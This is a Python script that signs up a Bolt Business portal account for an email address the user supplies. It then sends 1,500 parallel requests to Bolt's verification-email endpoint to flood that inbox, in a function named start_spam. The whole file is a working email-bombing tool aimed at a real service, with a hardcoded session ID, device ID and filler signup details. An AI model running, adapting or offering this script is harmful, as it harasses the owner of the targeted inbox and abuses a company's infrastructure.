import requests
import concurrent.futures

email = input("Enter The Email : ")

def Validate_user():

    url_1 = "https://node.bolt.eu/business-portal/businessPortal/v3/signup"
    params = {
        "version": "BP.19.82",
        "session_id": "1fd9fddb-b1ba-420d-a46a-983345056247b1724518694"
    }

    headers = {
        "Host": "node.bolt.eu",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://business.bolt.eu/",
        "Content-Type": "application/json",
        "Origin": "https://business.bolt.eu",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=4",
        "Te": "trailers"
    }

    data = {
        "device_uid": "1fd9fddb-b1ba-420d-a46a-983345056247",
        "device_name": "Firefox (Linux)",
        "device_os_version": "128.0",
        "company_name": "idk",
        "country_code": "de",
        "first_name": "admin",
        "last_name": "xss",
        "email": email,
        "password": "Password123@",
        "phone_number": "+213549281859",
        "headcount": "tier2",
        "client_language": "en-us",
        "terms_and_conditions_consent": 1
    }

    response = requests.post(url_1, headers=headers, params=params, json=data)

    if response.status_code == 200:
        json_response = response.json()
        print(f"Code: {json_response.get('code')}")
        start_spam()
    else:
        print(f"Request failed with status code {response.status_code}")


def send_verification_email(headers, params, data):
    url_2 = "https://node.bolt.eu/business-portal/businessPortal/sendVerificationEmail"
    response = requests.post(url_2, headers=headers, params=params, json=data)
    
    if response.status_code == 200:
        print("Verification email sent successfully.")
    else:
        x="Error"


def start_spam():
    headers = {
        "Host": "node.bolt.eu",
        "User-Agent": "Mozilla/5.0 (X11; Linux x86_64; rv:128.0) Gecko/20100101 Firefox/128.0",
        "Accept": "application/json",
        "Accept-Language": "en-US,en;q=0.5",
        "Accept-Encoding": "gzip, deflate, br",
        "Referer": "https://business.bolt.eu/",
        "Content-Type": "application/json",
        "Origin": "https://business.bolt.eu",
        "Sec-Fetch-Dest": "empty",
        "Sec-Fetch-Mode": "cors",
        "Sec-Fetch-Site": "same-site",
        "Priority": "u=4",
        "Te": "trailers"
    }

    params = {
        "version": "BP.19.82",
        "session_id": "1fd9fddb-b1ba-420d-a46a-983345056247b1724518694"
    }

    data = {
        "email": email
    }

    # Use ThreadPoolExecutor to send requests in parallel
    with concurrent.futures.ThreadPoolExecutor(max_workers=10) as executor:
        futures = [executor.submit(send_verification_email, headers, params, data) for _ in range(1500)]
        
        # Ensure all threads are completed
        concurrent.futures.wait(futures)


Validate_user()
